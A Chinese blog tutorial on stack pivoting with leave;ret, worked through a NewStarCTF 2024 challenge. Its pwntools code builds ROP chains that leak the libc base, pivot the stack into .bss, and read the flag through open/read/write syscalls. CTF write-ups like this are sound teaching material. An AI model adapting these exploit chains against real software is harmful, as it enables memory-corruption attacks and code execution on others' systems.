---
title: 栈迁移
date: 2024-11-24 08:39:04
tags:
categories:
- PWN
---
栈迁移多见于一些栈溢出长度不足以做更多的事，溢出长度仅仅能覆盖返回地址附近的情况。
要使用栈迁移则首先需要了解`leave; ret`指令。
便于理解的来说，`leave`指令等价于
```armasm
mov esp, ebp  ; 恢复栈指针
pop ebp       ; 恢复基址指针
```
`ret`指令等价于
```armasm
pop eip ; 这样写是方便理解，实际上不存在 pop eip 这个汇编指令
```
用32位程序的例子展示一下栈迁移的作用
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120090206.png)
这是初始时的栈空间，一半来说函数正常结束便会执行一次`leave; ret`指令，比如例子中执行后便会将`exp`移至`0xffffce28`处，`esp`移至`0xffffce08`处
但我们若是将原本`exp`处指向的地址更改了，再调用`leave; ret`指令，便可以控制`ebp`去往我们想让他去的地方，同时将原本的返回函数改为`leave; ret`指令，则可以使`esp`移至我们指向的地址执行指令。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120090544.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120090753.png)
注意，在上面的图例中，第二次执行`leave; ret`指令后发现`ebp`不见了，这是因为例子中`0xffffcdc8`指向的地址是未知的，实际应用时应注意。
这里用一道例题来举例。[NewStarCTF2024-Week4-reread](https://ctf.xidian.edu.cn/training/14?challenge=635)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120091518.png)
可以看到是有一个栈溢出贴脸的，但溢出长度只有`0x10`，仅仅的能覆盖返回函数，所以要用到栈迁移。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120092031.png)
按照之前分析的，将`rbp`指向的返回地址更换为我们想要的地址，这里是一段空的`bss`地址，同时将返回函数替换为`read`函数的地址再执行一遍来读入
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120092213.png)
可以看到执行完自带的`leave; ret`后，`rbp`的地址已经变为我们设定的`bss`段的地址
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120092254.png)
第二次执行`read`时便是向我们指向的地址读入数据。

接下来需要构造泄露libc基址的ROP链
```
payload2 = p64(bss2) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(vuln_read)

payload2 += p64(bss - 0x28) + p64(leave_ret)

p.send(payload2.rjust(0x50, b'a'))
```
这里解释一下这段`payload`为什么如此构造
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120093135.png)
这里我们相当于向`0x404120`的`bss`段注入了这些内容，在注入完这些内容后会执行`read`其自带的`leave; ret`函数
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120093358.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120093403.png)
执行完`leave`后会发现`rbp`和`rsp`分别移动到了0x404138与0x404168处
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120093506.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120093543.png)
继续执行`ret`后进入我们设定的返回函数，即`leave; ret`指令
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120093813.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120093836.png)
执行完第二次`leave; ret`后会发现程序按照我们希望的进入了泄露`puts`函数地址的段。
这部分详细解释一下，红色部分是上面第一次`leave; ret`后我们将`rbp`移到的空白`bss`段，黄色部分则相当于返回函数，`vuln`中`read`函数的读入是
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120094153.png)
所以是从`0x404120`开始一直读到`0x404170`为止，覆盖了返回地址和返回函数。
将返回地址设置为`bss- 0x8 * 5` 即为`0x404138`是我们泄露地址的ROP链的前一段，至于为什么将`0x404138`设为另一段`bss`地址`bss2`等会说。这里执行完`read`自带的`leave; ret`后会开始执行返回函数设置的`leave; ret`，将`rbp`再次转移到我们设置的`bss2`段，`rsp`则开始执行泄露`puts`函数地址的ROP链来获取libc基址。
现在说一下为什么要设置一个`bss2`，如果不设置的话，用一段`deadbeef`覆盖的话第二次`leave; ret`后`rbp`的位置就会无法找到，但我们目前仅仅获取了libc基址，后面仍需读入`orw`的ROP链来获取flag，这里设置`bss2`就是开辟一个新的空间来读入新的`payload`。

接下来则重复上面的操作，因为orw的ROP链一般较长，0x50不够，我们还需手动构造一个新的read函数来读入我们的ROP链，然后用新的read来读入ROP链。
```python
# 开辟新的bss段，用于存放ROP链，避免与前面冲突
payload3 = b'a' * (0x40) + p64(bss2 + 0x100) + p64(vuln_read)
p.send(payload3)
buf = bss2 + 0x100 - 0x8 * 1
read_addr = libc_base + lib.symbols['read']

payload4 = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buf) + p64(pop_rdx_r12) + p64(0x200) + p64(0) + p64(read_addr)
payload4 += p64(bss2 + 0x100 - 0x8 * 9) + p64(leave_ret)
p.send(payload4.ljust(0x50, b'a'))

# gdb.attach(p)
# open,dup2,read,write
payload5 = flat([
    pop_rdi, buf,
    pop_rsi, 0,
    pop_rdx_r12, 0, 0,
    pop_rax, 2,
    syscall,
    pop_rdi, 3,
    pop_rsi, 0,
    pop_rax, 33,
    syscall,
    pop_rdi, 0,
    pop_rsi, elf.bss(0x20),
    pop_rdx_r12, 0x100, 0,
    pop_rax, 0,
    syscall,
    pop_rdi, 1,
    pop_rsi, elf.bss(0x20),
    pop_rdx_r12, 0x40, 0,
    pop_rax, 1,
    syscall
])

payload5 = b'./flag\x00\x00' + payload5
p.send(payload5)
```

新的payload3注入的位置就是payload2里设置的bss2的位置
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120100910.png)
这里由于构造新read函数的ROP链长度刚好为0x50，我们没有空余空间控制rbp的范围地址，所以在注入payload5时，只能将payload5覆盖原来的位置让esp在leave; ret后直接执行。
执行后便能获取flag。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241120101523.png)